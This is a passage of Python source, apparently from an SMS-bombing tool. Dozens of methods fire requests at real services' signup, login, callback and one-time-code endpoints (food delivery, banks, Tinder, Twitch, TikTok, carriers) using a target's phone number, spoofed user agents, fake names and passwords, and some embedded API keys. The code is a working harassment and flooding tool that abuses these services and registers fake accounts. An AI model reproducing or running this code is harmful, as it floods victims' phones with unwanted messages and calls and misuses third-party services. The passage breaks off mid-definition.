        requests.post('https://piroginomerodin.ru/index.php?route=sms/login/sendreg',
          data={'telephone': '+' + self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pizza46(self):
        requests.post('https://pizza46.ru/ajaxGet.php',
          data={'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-####')},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pizzakaz(self):
        requests.post('https://pizzakazan.com/auth/ajax.php',
          data={'phone':'+' + self.phone,
         'method':'sendCode'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pizzasinizza(self):
        requests.post('https://pizzasinizza.ru/api/phoneCode.php',
          json={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def planetak(self):
        requests.get('https://cabinet.planetakino.ua/service/sms',
          params={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pliskov(self):
        requests.post('https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode',
          data={'phone': self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pomodoro(self):
        requests.post('https://butovo.pizzapomodoro.ru/ajax/user/auth.php',
          data={'AUTH_ACTION':'SEND_USER_CODE',
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def privatebank(self):
        requests.post('https://carddesign.privatbank.ua/phone',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def prosushi(self):
        requests.post('https://www.prosushi.ru/php/profile.php',
          data={'phone':self.phone,
         'mode':'sms'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def qbbox(self):
        requests.post('https://qbbox.ru/api/user',
          json={'phone':self.phone,
         'account_type':1},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def qlean(self):
        requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
          json={'phone': self.phone})
        requests.get('https://sso.cloud.qlean.ru/http/users/requestotp',
          headers={'Referer': 'https://qlean.ru/sso?redirectUrl=https://qlean.ru/'},
          params={'phone':self.phone,
         'clientId':'undefined',
         'sessionId':str(randint(5000, 9999))})

    def raiffeisen(self):
        requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code',
          params={'number': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def rbt(self):
        requests.post('https://www.rbt.ru/user/sendCode/',
          data={'phone': self.phone_mask})

    def rendesvouz(self):
        requests.post('https://www.rendez-vous.ru/callback/create/',
          data={'input_for_spam':'Callback',
         'name':name(),  'phone':phone_mask(self.phone_not_pluse, '+#(###)###-##-##'),
         'ajax':'callback-form',
         'yt2':'Отправить заявку'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sushiroll(self):
        requests.post('https://sushirolla.ru/page/save.php',
          data={'send_me_password':1,
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def richfamely(self):
        requests.post('https://region.richfamily.ru/ajax/sms_activities/sms_validate_phone.php',
          data=('phone=%2B' + phone_mask(self.phone_not_pluse, '#-###-###-##-##') + '&isAuth=Y&sessid=e3v9bp9aw4be3caeb4rd5ma2ea73e7d3'),
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def rieltor(self):
        requests.post('https://rieltor.ua/api/users/register-sms/',
          json={'phone':self.phone,
         'retry':0},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def rutaxi(self):
        requests.post('https://rutaxi.ru/ajax_auth.html',
          data={'l':self.phone,  'c':'3'}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def rutube(self):
        requests.post('https://pass.rutube.ru/api/accounts/phone/send-password/',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sayoris(self):
        requests.post('https://sayoris.ru/?route=parse/whats',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sedi(self):
        requests.get('https://msk1.sedi.ru/webapi',
          params={'callback':'jQuery19107992940218113256_1595059640271',
         'q':'get_activation_key',
         'phone':self.phone_mask,
         'way':'bysms',
         'usertype':'customer',
         'lang':'ru-RU',
         'apikey':'EF96ADBE-2DFC-48F7-AF0A-69A007223039'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def shafa(self):
        requests.post('https://shafa.ua/api/v3/graphiql',
          json={'operationName':'RegistrationSendSms',
         'variables':{'phoneNumber': self.phone},
         'query':'mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})
        requests.post('https://shafa.ua/api/v3/graphiql',
          json={'operationName':'sendResetPasswordSms',
         'variables':{'phoneNumber': self.phone},
         'query':'mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def shopandshow(self):
        requests.post('https://shopandshow.ru/sms/password-request/',
          data={'phone':self.phone,
         'resend':0},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def signalis(self):
        requests.post('https://deathstar.signal.is/auth',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sipnet(self):
        requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper',
          params={'oper':9,
         'callmode':1,  'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def smartspace(self):
        requests.post('https://smart.space/api/users/request_confirmation_code/',
          json={'mobile':self.phone,
         'action':'confirm_mobile'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sms4(self):
        requests.post('https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php',
          data={'demo_number':self.phone,
         'ajax_demo_send':'1'},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sovest(self):
        requests.get('https://oauth.sovest.ru/oauth/authorize',
          data={'client_id':'dbo_web',
         'response_type':'urn:qiwi:oauth:response-type:confirmation-id',
         'username':self.phone,
         'recaptcha':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sportmasterua(self):
        requests.get('https://www.sportmaster.ua/',
          params={'module':'users',
         'action':'SendSMSReg',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def oyorooms(self):
        requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone={self.phone}&country_code=%2B7&nod=4&locale=en", headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sravni(self):
        requests.get('https://www.sportmaster.ua/',
          params={'module':'users',
         'action':'SendSMSReg',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def startpizza(self):
        requests.post('https://pizzasushiwok.ru/index.php',
          data={'aj':'50',
         'registration-phone':phone_mask(self.phone_not_pluse, '+## (###) ###-##-##')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def suandi(self):
        requests.get('https://suandshi.ru/mobile_api/register_mobile_user',
          params={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sunlignt(self):
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': self.phone_not_pluse},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pizza_33(self):
        requests.get('https://auth.pizza33.ua/ua/join/check/',
          params={'callback':'angular.callbacks._1',
         'email':email(),
         'password':password(),
         'phone':self.phone,
         'utm_current_visit_started':0,
         'utm_first_visit':0,
         'utm_previous_visit':0,
         'utm_times_visited':0},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sushifuji(self):
        requests.post('https://sushifuji.ru/sms_send_ajax.php',
          data={'name':'false',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sushigour(self):
        requests.post('http://sushigourmet.ru/auth',
          data={'phone':phone_mask(self.phone_not_pluse, '8 (###) ###-##-##'),
         'stage':1},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def laguna(self):
        requests.post('https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code',
          data={'phone': phone_mask(self.phone_not_pluse, '8(###)###-##-##')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def sumaster(self):
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def sushiprof(self):
        requests.post('https://www.sushi-profi.ru/api/order/order-call/',
          json={'phone':self.phone,
         'name':_ru_name_()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def sushivesla(self):
        requests.post('https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization',
          json={'phone': phone_mask(self.phone_not_pluse, '+# ### ###-##-##')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tabasko(self):
        requests.post('https://tabasko.su/',
          data={'IS_AJAX':'Y',
         'COMPONENT_NAME':'AUTH',
         'ACTION':'GET_CODE',
         'LOGIN':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def tabris(self):
        requests.post('https://lk.tabris.ru/reg/',
          data={'action':'phone',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def tanuki(self):
        requests.post('https://www.tanuki.ru/api/',
          json={'header':{'version':'2.0',
          'userId':f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
          'agent':{'device':'desktop',
           'version':'undefined undefined'},
          'langId':'1',
          'cityId':'9'},
         'method':{'name': 'sendSmsCode'},
         'data':{'phone':f"({self.phone}",
          'type':1}},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def tarantionofamely(self):
        requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
          data={'action':'callback_phonenumber',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def taxi310(self):
        requests.post('http://62.149.7.19:7200/api/account/register/sendConfirmCode',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def taziritm(self):
        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
          data={'RECALL':'Y',
         'BACK_CALL_PHONE':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tele2(self):
        requests.post(('https://msk.tele2.ru/api/validation/number/' + self.phone),
          json={'sender': 'Tele2'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def thehive(self):
        requests.post('https://thehive.pro/auth/signup',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tiktok(self):
        requests.post('https://m.tiktok.com/node/send/download_link',
          json={'slideVerify':0,
         'language':'en',
         'PhoneRegin':self.country_code,
         'Mobile':self.phone,
         'page':{'af_adset_id':0,
          'pid':0}},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tinder(self):
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
          data={'phone_number': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tinkoff(self):
        requests.post('https://api.tinkoff.ru/v1/sign_up',
          data={'phone': self.phone})

    def topladeba(self):
        requests.post('https://topbladebar.ru/user_account/ajax.php?do=sms_code',
          data={'phone': f"{8}{self.phone_mask[2:]}"},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def topshop(self):
        requests.post('https://www.top-shop.ru/login/loginByPhone/',
          data={'phone': self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tvoaapteka(self):
        requests.post('https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1',
          data={'tel':'+' + self.phone_not_pluse,
         'change_code':1},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def twitch(self):
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
          json={'birthday':{'day':23,
          'month':5,  'year':1986},
         'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',
         'include_verification_code':True,
         'password':password(),
         'phone_number':self.phone,
         'username':username()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def online_sbis(self):
        requests.post('https://online.sbis.ru/reg/service/', json={'firstName':'паша',  'middleName':_ru_name_(),  'lastName':_ru_name_(),  'sex':'1',  'birthDate':'7.9.1997',  'mobilePhone':self.phone,  'russianFederationResident':'true',  'isDSA':'false',  'personalDataProcessingAgreement':'true',  'bKIRequestAgreement':'null',  'promotionAgreement':'true'}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def rutaxi_ru(self):
        requests.post('https://rutaxi.ru/ajax_auth.html', data={'l':self.phone[2:],  'c':'3'}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def ubki(self):
        requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth',
          json={'doc': {'auth': {'mphone':self.phone,
                          'bdate':'11.11.1999',
                          'deviceid':'00100',
                          'version':'1.0',
                          'source':'site',
                          'signature':'undefined'}}},
          headers={'User-Agent':user_agent(),
         'Accept':'application/json'})

    def uklon(self):
        agent = user_agent()
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
          headers={'User-Agent':agent,
         'client_id':'6289de851fc726f887af8d5d7a56c635'},
          json={'phone': self.phone})
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode',
          headers={'User-Agent':agent,
         'client_id':'6289de851fc726f887af8d5d7a56c635'},
          json={'phone': self.phone})

    def ulabka(self):
        requests.post('https://www.r-ulybka.ru/login/ajax.php',
          data={'action':'sendcode',
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def uralsib(self):
        requests.post('https://app.doma.uchi.ru/api/v1/parent/signup_start',
          json={'phone':self.phone,
         'first_name':'-',
         'utm_data':{},  'via':'call'})
        requests.post('https://app.doma.uchi.ru/api/v1/parent/signup_start',
          json={'phone':self.phone,
         'first_name':'-',
         'utm_data':{},  'via':'sms'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def artonline(self):
        requests.post('https://artonline24.ru/en/auth/?register=yes', data=('backurl=%2Fen%2Fauth%2F&AUTH_FORM=Y&TYPE=REGISTRATION&USER_NAME=' + name() + '&USER_LAST_NAME=' + name() + '&PERSONAL_PHONE=+7+%28942%29+342-34-23&USER_EMAIL=dgfsdfgsdf%40gmail.com&USER_PASSWORD=https%3A%2F%2Fartonline24&USER_CONFIRM_PASSWORD=https%3A%2F%2Fartonline24&captcha_sid=096da6d0583cc2aff3b71378edd27ed4&captcha_word=3FWNF&Register=Register'),
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def utrair(self):
        requests.post('https://b.utair.ru/api/v1/login/',
          data={'login': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def vezitaxi(self):
        requests.get('https://vezitaxi.com/api/employment/getsmscode',
          params={'phone':self.phone,
         'city':561,
         'callback':'jsonp_callback_35979'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def viza(self):
        requests.post('https://pay.visa.ru/api/Auth/code/request',
          json={'phoneNumber': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def vodafone(self):
        requests.post('https://www.vodafone.ua/shop/ru/vodafone_customer/register/sendSms/',
          data={'is_ajax':'true',
         'phone_number':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def vks(self):
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def webbank(self):
        requests.post('https://ng-api.webbankir.com/user/v2/create',
          json={'lastName':_ru_name_(),
         'firstName':_ru_name_(),
         'middleName':_ru_name_(),
         'mobilePhone':self.phone,
         'email':email(),
         'smsCode':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def wifimetro(self):
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms',
          data={'msisdn': self.phone},
          headers={'App-ID':'cabinet',
         'User-Agent':user_agent()})

    def work(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options('https://api.iconjob.co/api/auth/verification_code', headers=headers)
        requests.post('https://api.iconjob.co/api/auth/verification_code',
          json={'phone': self.phone},
          headers=headers)

    def wowworks(self):
        requests.post('https://api.wowworks.ru/v2/site/send-code',
          json={'phone':self.phone,
         'type':2},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def yandexeda(self):
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
          json={'phone_number': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def cloudmailru(self):
        requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={'phone':self.phone_not_pluse,
         'api':2,  'email':'email',  'x-email':'x-email'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def smsint(self):
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':name(),
         'phone':self.phone,  'promo':'yellowforma'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tehnosvit(self):
        requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':name(),
         'feedbackPhone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def icqcom(self):
